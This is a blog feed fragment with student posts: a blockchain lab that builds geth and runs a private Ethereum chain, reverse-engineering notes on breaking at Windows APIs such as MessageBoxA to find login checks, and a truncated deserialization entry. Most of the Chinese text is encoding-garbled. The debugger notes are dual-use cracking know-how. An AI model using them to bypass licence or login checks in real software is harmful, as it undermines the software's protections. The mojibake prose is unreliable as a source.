    <content type="html"><![CDATA[<h1 id="åŒºå—é“¾å®éªŒ1"><a href="#åŒºå—é“¾å®éªŒ1" class="headerlink" title="åŒºå—é“¾å®éªŒ1"></a>åŒºå—é“¾å®éªŒ1</h1><p>ç¬¬ä¸€å¼ é¢˜ç›®<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200906200.png" srcset="/img/loading.gif" lazyload><br>åŒºå—é“¾çš„æ“ä½œå¼•å¯¼<br>ç¬¬ä¸€æ­¥æŸ¥çœ‹å¼•å¯¼<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919655.png" srcset="/img/loading.gif" lazyload><br>ç¬¬äºŒæ­¥èŠ‚ç‚¹ä¸€<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919341.png" srcset="/img/loading.gif" lazyload><br>ç¬¬ä¸‰æ­¥èŠ‚ç‚¹äºŒ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919780.png" srcset="/img/loading.gif" lazyload><br>ç¬¬å››æ­¥æ·»åŠ èŠ‚ç‚¹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200920107.png" srcset="/img/loading.gif" lazyload><br>ç¬¬äº”æ­¥ï¼Œé€‰ä¸­ç‰¹å®šèŠ‚ç‚¹<br>ç¬¬å…­æ­¥ï¼Œé€‰ä¸­çŠ¶æ€æ ‡è¯†<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200921564.png" srcset="/img/loading.gif" lazyload><br>ç¬¬ä¸ƒæ­¥èŠ‚ç‚¹å¡ç‰‡ä¿¡æ¯<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922747.png" srcset="/img/loading.gif" lazyload><br>ç¬¬å…«æ­¥åˆ‡æ¢è¿æ¥çŠ¶æ€<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922040.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923900.png" srcset="/img/loading.gif" lazyload><br>ç¬¬ä¹æ­¥åˆ é™¤èŠ‚ç‚¹ï¼Œæ“ä½œæœŸé—´åˆ é™¤è¢«ç¦ç”¨<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923166.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923943.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åæ­¥é€šä¿¡æŒ‰é’®æ£€æŸ¥æ—¥å¿—å˜åŒ–<br>ç¬¬åä¸€æ­¥é€šä¿¡æ—¥å¿—å±•ç¤ºèŠ‚ç‚¹é—´é€šä¿¡è®°å½•<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200924117.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åäºŒæ­¥æ˜¾ç¤ºé€‰ä¸­èŠ‚ç‚¹çš„åŒºå—é“¾çŠ¶æ€<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200925174.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åäºŒæ­¥åŒºå—æ¦‚è¦ï¼Œç‚¹å‡»å¯æŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926983.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926289.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åå››æ­¥ï¼ŒèŠ‚ç‚¹äºŒæŒ–çŸ¿æŒ‰é’®<br>ç¬¬åäº”æ­¥æä¾›æ‰“åŒ…äº¤æ˜“å’Œé€‰æ‹©æŒ–çŸ¿æŒ‰é’®<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200927617.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åå…­æ­¥æŒ–çŸ¿ä¸¤æ¬¡ï¼Œè§‚å¯Ÿï¼Œæ•°æ®é“¾æ•°æ®å˜åŒ–åŒ…æ‹¬åŒºå—å’Œé«˜åº¦<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929661.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929913.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åä¸ƒæ­¥è§‚å¯Ÿä½™é¢<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931902.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åå…«æ­¥äº¤æ˜“<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931858.png" srcset="/img/loading.gif" lazyload><br>ç¬¬åä¹å¤«è¾“å…¥äº¤æ˜“å†…å®¹æ‰‹ç»­è´¹é€‰æ‹©UXTOåˆ›å»ºäº¤æ˜“<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933819.png" srcset="/img/loading.gif" lazyload><br>ç¬¬äºŒåæ­¥å¯åŠ¨äº¤æ˜“æ‰“åŒ…æŒ–çŸ¿<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933749.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200934133.png" srcset="/img/loading.gif" lazyload><br>ç¬¬äºŒåä¸€æ­¥é€‰æ‹©æœ€åä¸€ä¸ªåŒºå—<br>ç¬¬äºŒåä¸‰æ­¥åŒºå—çš„è¯¦ç»†ä¿¡æ¯<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200935271.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŒºå—é“¾2</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[<h1 id="åŒºå—é“¾æŠ€æœ¯å®éªŒ2"><a href="#åŒºå—é“¾æŠ€æœ¯å®éªŒ2" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯å®éªŒ2"></a>åŒºå—é“¾æŠ€æœ¯å®éªŒ2</h1><h2 id="å®‰è£…ä»¥å¤ªåŠ"><a href="#å®‰è£…ä»¥å¤ªåŠ" class="headerlink" title="å®‰è£…ä»¥å¤ªåŠ"></a>å®‰è£…ä»¥å¤ªåŠ</h2><p>sudo apt clear cache<br>sudo apt update<br>sudo apt-get install golang<br>sudo apt-get install make<br>sudo apt-get install git<br>sudo apt install build-essential<br>sudo apt-get install libltdl-dev<br>wget <a href="https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz">https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz</a><br>tar zxvf v1.9.25.tar.gz<br>è·å–å‹ç¼©æ–‡ä»¶ï¼Œå¹¶è§£å‹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250917601.png" srcset="/img/loading.gif" lazyload></p><h2 id="è®¾ç½®goä»£ç†"><a href="#è®¾ç½®goä»£ç†" class="headerlink" title="è®¾ç½®goä»£ç†"></a>è®¾ç½®goä»£ç†</h2><p>go env -w GO111MODULE&#x3D;on<br>go env -w GOPROXY&#x3D;<a href="https://mirrors.aliyun.com/goproxy/,direct">https://mirrors.aliyun.com/goproxy/,direct</a><br>cd go-ethereum-1.9.25<br>make geth<br>ç¼–è¯‘æˆåŠŸåæ·»åŠ path<br>nano .bashrc<br>#æœ«å°¾æ·»åŠ <br>export PATH&#x3D;â€$PATH:&#x2F;home&#x2F;kali&#x2F;go-ethereum-1.9.25&#x2F;build&#x2F;bin&#x2F;â€œ<br>#ctrl+x è¾“å…¥Yä¿å­˜åæ‰§è¡Œ<br>source .bashrc<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250923077.png" srcset="/img/loading.gif" lazyload></p><h2 id="æ­å»ºç§æœ‰é“¾"><a href="#æ­å»ºç§æœ‰é“¾" class="headerlink" title="æ­å»ºç§æœ‰é“¾"></a>æ­å»ºç§æœ‰é“¾</h2><p>nano &#x2F;home&#x2F;kali&#x2F;genesis.json<br>#è¾“å…¥å¦‚ä¸‹å†…å®¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">15665883188</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;petersburgBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;istanbulBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ethash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x5ddf8f3e&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x47b760&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x400&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasUsed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/202409250926397.png" srcset="/img/loading.gif" lazyload><br>ç›¸å…³è¯´æ˜<br>chainID:æŒ‡å®šäº†ç‹¬ç«‹çš„åŒºå—é“¾ç½‘ç»œ IDã€‚ç½‘ç»œ ID åœ¨è¿æ¥åˆ°å…¶ä»–èŠ‚ç‚¹çš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œä»¥å¤ªåŠå…¬ç½‘çš„ç½‘ç»œ ID æ˜¯ 1ï¼Œä¸ºäº†ä¸ä¸å…¬æœ‰é“¾ç½‘ç»œå†²çªï¼Œè¿è¡Œç§æœ‰é“¾èŠ‚ç‚¹çš„æ—¶å€™è¦æŒ‡å®šè‡ªå·±çš„ç½‘ç»œ IDã€‚ä¸åŒ ID ç½‘ç»œçš„èŠ‚ç‚¹æ— æ³•ç›¸äº’è¿æ¥ã€‚<br>alloc: ç”¨æ¥é¢„ç½®è´¦å·ä»¥åŠè´¦å·çš„ä»¥å¤ªå¸æ•°é‡ï¼Œå› ä¸ºç§æœ‰é“¾æŒ–çŸ¿æ¯”è¾ƒå®¹æ˜“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦é¢„ç½®æœ‰å¸çš„è´¦å·ï¼Œéœ€è¦çš„æ—¶å€™è‡ªå·±åˆ›å»ºå³å¯ä»¥ï¼Œé»˜è®¤ä¸ºç©ºå³å¯ã€‚<br>coinbase: çŸ¿å·¥çš„è´¦å·ï¼Œéšä¾¿å¡«å³å¯ã€‚<br>difficulty: è®¾ç½®å½“å‰åŒºå—çš„éš¾åº¦ï¼Œå¦‚æœéš¾åº¦è¿‡å¤§ï¼ŒcpuæŒ–çŸ¿å°±å¾ˆéš¾ï¼Œè¿™é‡Œè®¾ç½®è¾ƒå°éš¾åº¦ã€‚<br>extraData: é™„åŠ ä¿¡æ¯ã€‚è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œæ–°ç‰ˆæœ¬è¯¥å€¼éœ€è¦ä¸º16è¿›åˆ¶æ•°æ®ï¼Œä»¥0x å¼€å¤´ã€‚<br>gasLimit: è¯¥å€¼è®¾ç½®å¯¹GASçš„æ¶ˆè€—æ€»é‡é™åˆ¶ï¼Œç”¨æ¥é™åˆ¶åŒºå—èƒ½åŒ…å«çš„äº¤æ˜“ä¿¡æ¯æ€»å’Œï¼Œå› ä¸ºæˆ‘ä»¬è¦åšçš„æ˜¯ç§æœ‰é“¾ï¼Œæ‰€ä»¥æ­¤å¤„å¡«æœ€å¤§ã€‚<br>nonce: nonceå°±æ˜¯ä¸€ä¸ª64ä½éšæœºæ•°(0xåä¸€ä½ä¸º4ä¸ªäºŒè¿›åˆ¶ä½ï¼Œæ•…æœ‰16ä½ï¼‰ï¼Œç”¨äºæŒ–çŸ¿ï¼Œæ³¨æ„ä»–å’Œmixhashçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„Yellow paper, 4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚<br>mixhashï¼šä¸nonceé…åˆç”¨äºæŒ–çŸ¿ï¼Œç”±ä¸Šä¸€ä¸ªåŒºå—çš„ä¸€éƒ¨åˆ†ç”Ÿæˆçš„hashã€‚æ³¨æ„ä»–å’Œnonceçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„Yellow paper, 4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚<br>parentHash: ä¸Šä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œå› ä¸ºæ˜¯åˆ›ä¸–å—ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼æ˜¯0ã€‚<br>timestamp: è®¾ç½®åˆ›ä¸–å—çš„æ—¶é—´æˆ³ã€‚  </p><h2 id="åˆå§‹åŒ–åˆ›ä¸–åŒºå—"><a href="#åˆå§‹åŒ–åˆ›ä¸–åŒºå—" class="headerlink" title="åˆå§‹åŒ–åˆ›ä¸–åŒºå—"></a>åˆå§‹åŒ–åˆ›ä¸–åŒºå—</h2><p>mkdir &#x2F;home&#x2F;kali&#x2F;privatechain<br>mv &#x2F;home&#x2F;kali&#x2F;genesis.json &#x2F;home&#x2F;kali&#x2F;privatechain<br>cd &#x2F;home&#x2F;kali&#x2F;privatechain<br>geth â€“datadir data0 init genesis.json<br>#è¿”å›successfully wrote genesis state å³æˆåŠŸ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270915848.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸç”Ÿæˆåˆ›ä¸–åŒºå—<br>å¯åŠ¨ç§æœ‰é“¾<br>geth â€“identity â€œSCAUâ€ â€“rpc â€“rpcport â€œ8545â€ â€“datadir data0 â€“port â€œ30303â€ â€“rpcapi â€œdb,eth,net,web3â€ â€“allow-insecure-unlock â€“networkid 65534 â€“nodiscover console<br>â€˜â€™â€™<br>å¯åŠ¨æˆåŠŸ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270917438.png" srcset="/img/loading.gif" lazyload><br>åˆ›å»ºè´¦æˆ·<br>personal.newAccount(â€œ0000â€)<br>personal.newAccount(â€œ1234â€)<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270921285.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹ç”¨æˆ·ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸¤ä¸ªç”¨æˆ·ï¼Œå¹¶è·å–è´¦å·<br>personal.listAccounts<br>personal.listAccounts[0]<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923613.png" srcset="/img/loading.gif" lazyload><br>æŸ¥çœ‹è´¦æˆ·ä½™é¢ï¼Œæ²¡æœ‰æŒ–çŸ¿çš„æƒ…å†µä¸‹æ˜¾ç¤ºä¸º0<br>eth.getBalance(personal.listAccounts[0])<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923628.png" srcset="/img/loading.gif" lazyload><br>è§£é”æˆ‘ä»¬çš„0å·è´¦æˆ·è¾“å…¥å¯†ç ï¼Œå°±æ˜¯æˆ‘ä»¬åˆ›å»ºè´¦æˆ·æ—¶ç”¨çš„0000<br>personal.unlockAccount(personal.listAccounts[0]);<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270929356.png" srcset="/img/loading.gif" lazyload><br>ç„¶åæˆ‘ä»¬å¼€å§‹æŒ–çŸ¿<br>miner.start()ä¸€èˆ¬ç”¨è¿™ä¸ªå°±è¡Œ<br>æ³¨æ„è¿™é‡Œå¼€å§‹æŒ–çŸ¿åä¼šæç¤ºGenerating DAG in progressï¼šç”ŸæˆDAGï¼Œå®ƒæ˜¯ç”¨äºä»¥å¤ªåŠå·¥ä½œé‡è¯æ˜PoWç®—æ³•çš„æ•°æ®é›†ï¼Œéœ€è¦èŠ±ä¸€äº›æ—¶é—´å»ç”Ÿæˆï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œæ¯å½“ç”Ÿæˆ30000å—æ‰ä¼šæ›´æ–°<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270930561.png" srcset="/img/loading.gif" lazyload><br>åœæ­¢æŒ–çŸ¿<br>miner.stop()<br>eth.accountsï¼šæšä¸¾ç³»ç»Ÿä¸­çš„è´¦æˆ·ï¼›<br>eth.getBalance()ï¼šæŸ¥çœ‹è´¦æˆ·ä½™é¢ï¼Œå•ä½æ˜¯ Weiï¼ˆWei æ˜¯ä»¥å¤ªåŠä¸­æœ€å°è´§å¸é¢é¢å•ä½ï¼Œç±»ä¼¼æ¯”ç‰¹å¸ä¸­çš„èªï¼Œ1 ether &#x3D; 10^18 Weiï¼‰ï¼›<br>eth.blockNumberï¼šåˆ—å‡ºåŒºå—æ€»æ•°ï¼›<br>eth.getTransaction()ï¼šè·å–äº¤æ˜“ï¼›<br>eth.getBlock()ï¼šè·å–åŒºå—ï¼›<br>web3.fromWei()ï¼šWei æ¢ç®—æˆä»¥å¤ªå¸ï¼›<br>web3.toWei()ï¼šä»¥å¤ªå¸æ¢ç®—æˆ Weiï¼›<br>txpool.statusï¼šäº¤æ˜“æ± ä¸­çš„çŠ¶æ€ï¼›<br>admin.addPeer()ï¼šè¿æ¥åˆ°å…¶ä»–èŠ‚ç‚¹ï¼›<br>æŒ–çŸ¿æˆåŠŸåå¯ä»¥æŸ¥çœ‹è´¦æˆ·ä½™é¢<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270941668.png" srcset="/img/loading.gif" lazyload><br>æ‰“é’±ä¹‹å‰å…ˆè§£é”ä¸€ä¸‹å‡ºé’±çš„è´¦æˆ·<br>personal.unlockAccount(personal.listAccounts[0]);<br>é‡‘é¢è½¬æ¢<br>amount &#x3D; web3.toWei(1,â€™etherâ€™)<br>eth.sendTransaction({from:personal.listAccounts[0],to:personal.listAccounts[1],value:amount})<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270942094.png" srcset="/img/loading.gif" lazyload><br>äº¤æ˜“æ²¡æœ‰å‘ç”Ÿï¼Œè¦åœ¨æ‰“åŒ…æŒ–çŸ¿åæ‰ä¼šå‘ç”Ÿ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270944030.png" srcset="/img/loading.gif" lazyload><br>å¼€å§‹æŒ–çŸ¿ï¼Œäº¤æ˜“æˆåŠŸ<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270948911.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§çš„API</title>
    <link href="/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/"/>
    <url>/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/</url>
    
    <content type="html"><![CDATA[<h3 id="å¸¸è§çš„APIæ¥å£æŸ¥æ‰¾æ–¹æ³•"><a href="#å¸¸è§çš„APIæ¥å£æŸ¥æ‰¾æ–¹æ³•" class="headerlink" title="å¸¸è§çš„APIæ¥å£æŸ¥æ‰¾æ–¹æ³•"></a>å¸¸è§çš„APIæ¥å£æŸ¥æ‰¾æ–¹æ³•</h3><p>å†™ä¸€äº›å¸¸è§çš„APIä»¥åæ¯æ¬¡é‡è§æˆ‘éƒ½ä¼šæŠ„ä¸‹æ¥ï¼Œå†™ä¸€ä¸‹ç›¸å…³çš„è§£é‡Šå’Œä»€ä¹ˆæ—¶å€™å¯ä»¥ç”¨åˆ°<br>æˆ‘ä»¬è¦æœ‰ä¸€ä¸ªæƒ³æ³•ï¼Œå‡¡æ˜¯è¿™äº›apiæˆ‘ä»¬éƒ½çŸ¥é“è¿™äº›éƒ½æ˜¯ç³»ç»Ÿæ‰€å†™å¥½çš„ä¸œè¥¿ï¼ŒåŠ¨æ€é“¾æ¥åº“ç»™æˆ‘ä»¬å‡†å¤‡å¥½çš„æ¥å£ï¼Œå°±åƒcè¯­è¨€å¯¼å…¥çš„å¤´æ–‡ä»¶ï¼Œä½†æ˜¯å¾ˆå¤šå¼ºè€…ä¹Ÿå¯èƒ½æ ¹æœ¬å°±ä¸å±‘è¿™äº›apiè‡ªå·±å®ç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å®Œè›‹äº†ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ ¹æ®å¯èƒ½ç¼–å†™çš„ä»£ç ï¼Œä¸‹æ–­ç‚¹ï¼Œé€†å‘æœ¬è´¨å°±æ˜¯ç”±æ±‡ç¼–çœ‹ä»£ç </p><h4 id="odå¿«é€ŸæŸ¥æ‰¾"><a href="#odå¿«é€ŸæŸ¥æ‰¾" class="headerlink" title="odå¿«é€ŸæŸ¥æ‰¾"></a>odå¿«é€ŸæŸ¥æ‰¾</h4><p>çªç„¶å‘ç°odæ—©å°±æœ‰å¤äººåˆ›å»ºçš„apiæ–­ç”µå™¨äº†ï¼Œå¯å–œå¯è´ºå¯å–œå¯è´º<br><img src="https://gitee.com/fogpost/photo/raw/master/202409201016637.png" srcset="/img/loading.gif" lazyload></p><h4 id="odçš„å‘½ä»¤è¡Œæ–­ç‚¹"><a href="#odçš„å‘½ä»¤è¡Œæ–­ç‚¹" class="headerlink" title="odçš„å‘½ä»¤è¡Œæ–­ç‚¹"></a>odçš„å‘½ä»¤è¡Œæ–­ç‚¹</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018652.png" srcset="/img/loading.gif" lazyload></p><h4 id="æ¨¡å—åç§°æŸ¥æ‰¾"><a href="#æ¨¡å—åç§°æŸ¥æ‰¾" class="headerlink" title="æ¨¡å—åç§°æŸ¥æ‰¾"></a>æ¨¡å—åç§°æŸ¥æ‰¾</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018703.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409201019644.png" srcset="/img/loading.gif" lazyload></p><h3 id="å¸¸è§çš„api"><a href="#å¸¸è§çš„api" class="headerlink" title="å¸¸è§çš„api"></a>å¸¸è§çš„api</h3><h4 id="MessageBoxA"><a href="#MessageBoxA" class="headerlink" title="MessageBoxA"></a>MessageBoxA</h4><p>è¿™ä¸ªäººå°½çš†çŸ¥ï¼Œåœ¨å‡ºç°ç±»ä¼¼ç™»å½•çš„çª—å£æ—¶å½“æˆ‘ä»¬é€‰æ‹©ç™»å½•æŒ‰é”®æ—¶ä¾¿ä¼šå‘ç°ï¼Œæœ‰å¼¹çª—ä¾¿å¯ä»¥åœ¨æ­¤apiä¸‹æ–­ç‚¹ï¼Œåˆ°è¾¾åˆ¤æ–­ä½ç½®</p><h4 id="GetwindowsTestA"><a href="#GetwindowsTestA" class="headerlink" title="GetwindowsTestA"></a>GetwindowsTestA</h4><p>è¿™ä¸ªçš„è¯æ˜¯åœ¨ç™»å½•çª—å£æ— æ˜æ˜¾å›æ˜¾æ—¶ä½¿ç”¨çš„æ–¹æ³•å¯ä»¥è·å–æˆ‘ä»¬çš„çª—å£è¾“å…¥æ–‡æœ¬</p><h4 id="æ˜“è¯­è¨€çš„çª—å£ç‰¹å¾ID"><a href="#æ˜“è¯­è¨€çš„çª—å£ç‰¹å¾ID" class="headerlink" title="æ˜“è¯­è¨€çš„çª—å£ç‰¹å¾ID"></a>æ˜“è¯­è¨€çš„çª—å£ç‰¹å¾ID</h4><p>çœ‹åˆ°004012ACè¿™å¥ä»£ç  PUSH  5201008äº†å—<br>PUSH 10001ï¼Œå‘Šè¯‰ä½ ï¼Œè¿™ä¸ªæ˜¯æ˜“è¯­è¨€é€šç”¨çš„ï¼Œæ¯ä¸ªçª—å£IDè¯­å¥ä¸Šé¢éƒ½ä¼šæœ‰ä¸€ä¸ªPUSH 10001</p><h4 id="Openfile"><a href="#Openfile" class="headerlink" title="Openfile"></a>Openfile</h4><p>æ‰“å¼€æ–‡ä»¶çš„apiæ„å»ºï¼Œç”¨åˆ°å†è¯´</p><h4 id="GetDlgItemInt"><a href="#GetDlgItemInt" class="headerlink" title="GetDlgItemInt"></a>GetDlgItemInt</h4><p>å°†è·å–çš„æ–‡æœ¬è½¬åŒ–ä¸ºæ•´æ•°</p><h4 id="SetWindowsTextA"><a href="#SetWindowsTextA" class="headerlink" title="SetWindowsTextA"></a>SetWindowsTextA</h4><p>å°†æŸä¸ªçª—å£æˆ–è€…å­—æ®µä¸­çš„æ–‡å­—è¿›è¡Œè®¾å®šæ‰€è°ƒç”¨çš„apiçª—å£å“¦</p><h3 id="ä¸»è¦çš„dll"><a href="#ä¸»è¦çš„dll" class="headerlink" title="ä¸»è¦çš„dll"></a>ä¸»è¦çš„dll</h3><p>çœ‹æ ·å­æˆ‘åé¢è¿˜è¦äº†è§£ä¸€ä¸‹ï¼Œè¿™äº›apiåœ¨é‚£äº›dllé‡Œé¢äº†</p><p>kernel32.dllã€user32.dllã€gdi32.dll</p>]]></content>
    
    
    <categories>
      
      <category>é€†å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webååºåˆ—åŒ–</title>
    <link href="/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
